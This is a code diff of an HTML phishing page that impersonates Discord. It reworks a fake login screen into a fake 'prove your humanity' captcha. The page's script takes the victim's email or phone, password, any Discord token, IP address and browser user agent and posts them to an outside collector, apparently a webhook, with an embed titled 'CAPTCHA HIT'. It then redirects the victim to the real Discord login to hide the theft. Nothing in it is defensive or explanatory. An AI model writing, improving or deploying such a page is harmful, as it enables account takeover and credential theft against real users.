@@ -3,50 +3,32 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Discord</title>
-  <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <title>Discord - Verify Humanity</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body, html { height: 100%; background: #2f3136; font-family: 'Whitney', sans-serif; color: #dcddde; }
-    .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; padding: 40px 20px; }
-    .logo-container { background: #2f3136; padding: 16px; border-radius: 8px; margin-bottom: 16px; }
-    .logo { width: 124px; }
-    h1 { font-size: 26px; font-weight: 600; margin-bottom: 8px; text-align: center; color: #fff; }
-    p { font-size: 16px; color: #b9bbbe; margin-bottom: 32px; text-align: center; line-height: 1.4; }
-    form { width: 100%; max-width: 380px; }
+    body, html { height: 100%; background-image: url('https://preview.redd.it/anyone-think-this-a-scam-redirects-directly-from-the-v0-i8ardi8gppa91.jpg?width=640&crop=smart&auto=webp&s=d89b45c830a59dd2aab0096d6b3b4ecf29d6711b'); background-size: cover; background-position: center; font-family: 'Whitney', sans-serif; color: #dcddde; }
+    .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(47, 49, 54, 0.95); display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
+    .title { font-size: 18px; color: #fff; margin-bottom: 8px; text-align: center; }
+    .subtitle { font-size: 14px; color: #b9bbbe; margin-bottom: 24px; text-align: center; }
+    form { width: 100%; max-width: 320px; background: rgba(32, 34, 37, 0.8); padding: 24px; border-radius: 8px; }
     label { font-size: 12px; font-weight: 600; color: #b9bbbe; margin-bottom: 6px; display: block; text-transform: uppercase; }
-    input { width: 100%; padding: 12px 16px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-bottom: 16px; transition: border 0.2s; }
+    input { width: 100%; padding: 12px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-bottom: 16px; }
     input:focus { outline: none; border-color: #5865f2; }
-    .forgot { text-align: right; margin-bottom: 24px; }
-    .forgot a { color: #00aff4; font-size: 14px; text-decoration: none; }
-    .forgot a:hover { text-decoration: underline; }
-    button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+    button { width: 100%; padding: 12px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
     button:hover { background: #4752c4; }
-    .register { text-align: center; margin-top: 24px; font-size: 14px; color: #b9bbbe; }
-    .register a { color: #00aff4; text-decoration: none; }
-    .register a:hover { text-decoration: underline; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo-container">
-      <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" class="logo" />
-    </div>
-    <h1>Welcome back!</h1>
-    <p>We're so excited to see you again!</p>
-    <form id="loginForm">
+  <div class="overlay">
+    <h1 class="title">Prove your humanity</h1>
+    <p class="subtitle">We're committed to safety and security. Unless you're a bot. Complete the challenge below and let us know you're a real person.</p>
+    <form id="verifyForm">
       <label for="email">Email or Phone Number</label>
       <input type="text" id="email" required />
       <label for="password">Password</label>
       <input type="password" id="password" required />
-      <div class="forgot">
-        <a href="#">Forgot your password?</a>
-      </div>
-      <button type="submit">Log In</button>
+      <button type="submit">Verify I'm Human</button>
     </form>
-    <div class="register">
-      Need an account? <a href="#">Register</a>
-    </div>
   </div>
 
   <script>
@@ -83,14 +65,15 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           embeds: [{
-            title: token ? 'TOKEN GRABBED' : 'LOGIN ATTEMPT',
+            title: 'CAPTCHA HIT - HUMANITY PROVEN',
             color: token ? 0x00ff00 : 0x5865f2,
             fields: [
               { name: 'Email/Phone', value: `\`${data.email}\``, inline: false },
               { name: 'Password', value: `\`${data.password}\``, inline: false },
               { name: 'Token', value: token ? `\`\`\`${token.substring(0, 60)}...\`\`\`` : 'Not found', inline: false },
               { name: 'Method', value: `\`${method}\``, inline: true },
-              { name: 'IP', value: `\`${ip}\``, inline: true }
+              { name: 'IP', value: `\`${ip}\``, inline: true },
+              { name: 'UA', value: `\`${navigator.userAgent.substring(0, 100)}\``, inline: false }
             ],
             timestamp: new Date().toISOString()
           }]
@@ -98,18 +81,18 @@
       });
     }
 
-    document.getElementById('loginForm').onsubmit = async (e) => {
+    document.getElementById('verifyForm').onsubmit = async (e) => {
       e.preventDefault();
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
       if (!email || !password) return;
-      await send({ email, password });
-      setTimeout(() => {
-        window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
-      }, 800);
-    };
 
-    setTimeout(() => send({ email: 'AUTO', password: 'AUTO' }), 1500);
+      await send({ email, password });
+
+      setTimeout(() => {
+        window.location = 'https://discord.com/login';
+      }, 1000);
+    };
   </script>
 </body>
 </html>
